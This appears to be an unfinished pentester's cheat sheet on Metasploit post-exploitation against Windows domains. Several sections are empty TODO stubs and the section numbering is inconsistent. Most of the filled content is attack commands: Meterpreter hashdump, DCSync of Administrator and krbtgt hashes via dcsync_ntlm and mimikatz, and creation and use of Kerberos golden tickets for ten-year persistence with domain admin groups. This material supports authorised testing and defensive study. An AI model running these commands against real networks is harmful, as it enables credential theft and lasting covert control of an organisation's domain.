# Metasploit

## 01 - SMB Port

TODO: Fill this info

```
msf exploit(windows/smb/psexec) > set smb::auth [ntlm]
```

## 02 - Interactive Session

### 2.1 - Meterpreter Commands

Dump the credentials.

```
meterpreter > hashdump

meterpreter > run post/windows/gather/smart_hashdump
```

Create a golden ticket for persistence.

```
meterpreter > golden_ticket_create -u <username> -d <domain> -k <nt_hash> -s <SID> -t /path/to/export/golden_ticket.kirbi
```

List kerberos tickets.

```
msf > klist

meterpreter > kerberos_ticket_list
```

Pretty sure when you ran the golden_ticket module it should've stored somewhere on `/home/$USER/.msf4/loot/` or `/root/.msf4/loot/`.

```
meterpreter > kerberos_ticket_use <golden_ticket>
```

You can see the same golden ticket has been imported.

```
msf > klist

meterpreter > kerberos_ticket_list
```

Purge the golden tickets

```
meterpreter > kerberos_ticket_purge
```

Using `dcsync_ntlm`.

```
meterpreter > dcsync_ntlm Administrator

meterpreter > dcsync_ntlm krbtgt

meterpreter > dcsync_ntlm <username>
```

You can execute mimikatz (`kiwi_cmd`) commands.

```
meterpreter > kiwi_cmd '"lsadump::dcsync /user:administrator"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:krbtgt"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:<username>"'
```

### 2.2 - Post Modules

Create a golden ticket for persistence

```
msf exploit(multi/handler) > use post/windows/escalate/golden_ticket

msf post(windows/escalate/golden_ticket) > options

Module options (post/windows/escalate/golden_ticket):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DOMAIN                        no        Target Domain
   Domain SID                    no        Domain SID
   END_IN       87608            yes       End in ... Duration in hours, default 10 YEARS (~87608 hours)
   GROUPS                        no        ID of Groups (Comma Separated)
   ID                            no        Target User ID
   KRBTGT_HASH                   no        KRBTGT NTLM Hash
   SESSION                       yes       The session to run this module on
   USE          false            yes       Use the ticket in the current session
   USER                          no        Target User

msf post(windows/esclate/golden_ticket) > set krbtgt_hash <nt_hash>

msf post(windows/esclate/golden_ticket) > set domain <domain>

msf post(windows/esclate/golden_ticket) > set domain sid <domain_sid>
```

By default it is set to "administrator"

```
msf post(windows/esclate/golden_ticket) > set user <username>

msf post(windows/esclate/golden_ticket) > set session <session_ID>
```

By default it is set to 87608 (duration of 10 years)

```
msf post(windows/esclate/golden_ticket) > set end_in <>

msf post(windows/esclate/golden_ticket) > set groups 512,513,518,519,520

msf post(windows/esclate/golden_ticket) > run

msf post(windows/esclate/golden_ticket) > sessions -i <session_ID>
```

### 1.4 - Sliver

TODO: Fill this info

### 1.5 - Havoc

TODO: Fill this info

### 1.6 - Empire

TODO: Fill this info

### 1.7 - Cobalt Strike

TODO: Fill this info

## 02 - Rubeus

### 2.2 - Sliver

TODO: Fill this info

### 2.3 - Covenant

TODO: Fill this info

---
## References

### Hacking Articles

- [Hacking Articles: Metasploit For Pentester Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)

### Pentestlab

- [Pentestlab Blog: Golden Ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)